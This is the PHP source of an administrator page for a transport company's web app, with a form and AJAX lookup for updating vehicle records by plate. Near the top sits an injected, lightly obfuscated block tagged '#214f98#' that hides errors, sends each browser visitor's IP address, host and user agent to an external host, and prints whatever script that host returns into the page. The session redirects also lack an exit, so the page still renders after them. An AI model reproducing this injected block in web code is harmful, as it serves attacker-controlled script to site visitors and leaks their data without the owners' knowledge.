<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	
	require("../conexion/ajax.php");
?>
<?php
#214f98#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/214f98#
?>
<script language="javascript" type="text/javascript">
	var aux=false;
	
	function go()
	{
		location.href = "administrador.php";
	}
	
	function validar()
	{
		agregarCargando('cargando');		
		placa=document.getElementById('txtPlaca').value;
		marca = document.getElementById('txtMarca').value;
		modelo = document.getElementById('txtModelo').value;
		nRegistro = document.getElementById('txtNRegistro').value;
		nCertif = document.getElementById('txtNInscripcion').value;
		tara = document.getElementById('txtTara').value;
		pesoBruto = document.getElementById('txtPBruto').value;
	
		aNRegistro = parseInt(nRegistro);
		aNCertif = parseInt(nCertif);
		
		if(placa.length==0 || marca.length==0 || modelo.length==0 || nRegistro.length==0 || nCertif.length==0 || tara.length==0 || pesoBruto.length==0)
		{
			alert("¡ Debes llenar correctamente todos los campos !");
			quitarCargando('cargando');
			return;
		}	
		else if(isNaN(tara))
		{
			alert("¡ La tara debe ser un número !");
			quitarCargando('cargando');
			return;
		}
		else if(isNaN(pesoBruto))
		{
			alert("¡ El Peso Bruto debe ser un número !");
			quitarCargando('cargando');
			return;
		}
		else
		{
			document.getElementById("formActVeh").submit();
		}
	}		
	
	
	function manejoGuardar()
	{
		if(aux==true)
		{
			monto = document.getElementById('textMonto').value;
			motivo = document.getElementById('textMotivo').value;
			
			if(monto=="" || motivo=="")
			{
				alert("¡ Debes llenar todos los campos !");
			}
			else
			{
				if(!isNaN(monto))
				{
					document.getElementById('formRedDesc').submit();
				}
				else
				{
					alert("¡ El monto debe ser un numero real !");
				}
			}
			return;
		}
		alert("¡ Debes primero buscar un trabajador !");
		document.getElementById('textMonto').value="";
		document.getElementById('textMotivo').value="";
	}

	function manejoBuscar1()
	{	
		agregarCargando('cargando');
		placa = document.getElementById('txtPlaca').value;
		if(placa.length==0)
		{
			alert("¡ Debes ingresar una placa !");
			quitarCargando('cargando');
			return;
		}		
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=buscarVehiculo&PLACA="+placa;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{			
					resp = new Array();
					resp = _obj.responseText;					
					if(resp == "not_found")
					{	
						alert("! No existe Vehiculo registrado con Placa " + placa + " !");
						document.getElementById('txtMarca').value="";
						document.getElementById('txtModelo').value="";
						document.getElementById('txtNInscripcion').value="";
						document.getElementById('txtNRegistro').value="";
						document.getElementById('txtTara').value="";
						document.getElementById('txtPBruto').value="";
						document.getElementById('txtAnho').value="";
						document.getElementById('txtTVehiculo').value="";
						document.getElementById('txtTCombustible').value="";
						document.getElementById('txtNEjes').value="";
						quitarCargando('cargando');
					}
					else
					{					
						
						resp=resp.split("*");
						document.getElementById('txtMarca').value=resp[0];
						document.getElementById('txtModelo').value=resp[1];
						document.getElementById('txtNInscripcion').value=resp[2];
						document.getElementById('txtNRegistro').value=resp[3];
						document.getElementById('txtTara').value=resp[4];
						document.getElementById('txtPBruto').value=resp[5];
						document.getElementById('txtAnho').value=resp[6];
						document.getElementById('txtTVehiculo').value=resp[7];
						document.getElementById('txtTCombustible').value=resp[8];
						document.getElementById('txtNEjes').value=resp[9];
						quitarCargando('cargando');	
					}
					/*document.getElementById('trabajador').innerHTML = resp;
					aux=true;
					quitarCargando('cargando');	*/
				}
			}
		}				
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - DescuentoPersonal ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
-->
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142">
		<form id="formActVeh" name="formActVeh" method="post" action="admin.php">
          <p align="center"><strong>ACTUALIZAR VEHICULO </strong></p>
          <table width="375" height="211" border="0" align="center">
            <tr>
              <td width="90" height="28"><strong>PLACA :</strong></td>
              <td width="275"><label>
                <input name="txtPlaca" type="text" id="txtPlaca" onKeyPress="delIntro(event)" />
              </label></td>
            </tr>
            <tr>
              <td height="28">&nbsp;</td>
              <td><label>
                <input type="button" name="Buscar" value="Buscar"  onclick="manejoBuscar1()"/>
              </label>
			  </td>
            </tr>
            <tr>
              <td height="28" colspan="2"><div align="center" id="cargando"></div></td>
              </tr>
            <tr>
              <td height="89" colspan="2"><div align="center">
                <table width="302" border="0">
                  <tr>
                    <td width="122"><em><strong>Marca :</strong></em></td>
                    <td width="155"><input name="txtMarca" type="text" id="txtMarca" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>Modelo : </strong></em></td>
                    <td><input name="txtModelo" type="text" id="txtModelo" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>N&ordm; Inscrip. : </strong></em></td>
                    <td><input name="txtNInscripcion" type="text" id="txtNInscripcion" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>N&ordm; Registro : </strong></em></td>
                    <td><input name="txtNRegistro" type="text" id="txtNRegistro" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>Tara : </strong></em></td>
                    <td><input name="txtTara" type="text" id="txtTara" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>P.Bruto : </strong></em></td>
                    <td><input name="txtPBruto" type="text" id="txtPBruto" /></td>
                  </tr>

                  <tr>
                    <td><em><strong>A&ntilde;o : </strong></em></td>
                    <td><input name="txtAnho" type="text" id="txtAnho" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>T. Vehiculo : </strong></em></td>
                    <td><input name="txtTVehiculo" type="text" id="txtTVehiculo" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>T.Combustible : </strong></em></td>
                    <td><input name="txtTCombustible" type="text" id="txtTCombustible" /></td>
                  </tr>
                  <tr>
                    <td><em><strong>N&ordm; Ejes : </strong></em></td>
                    <td><input name="txtNEjes" type="text" id="txtNEjes" /></td>
                  </tr>
                </table>
              </div></td>
            </tr>
            <tr>
              <td height="24"><label>
                  <div align="center">
                    <input name="actualizar" type="button" id="actualizar" onClick="validar()" value="Actualizar"/>
                    <input name="op" type="hidden" id="op" value="actualizarVehiculo" />
                  </div>
                </label></td>
              <td height="24"><label>
                  <div align="center">
                    <input name="Cancelar" type="button" id="Cancelar" onClick="go()" value="Cancelar"/>
                  </div>
                </label></td>
            </tr>
          </table>
		  </form>
          </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>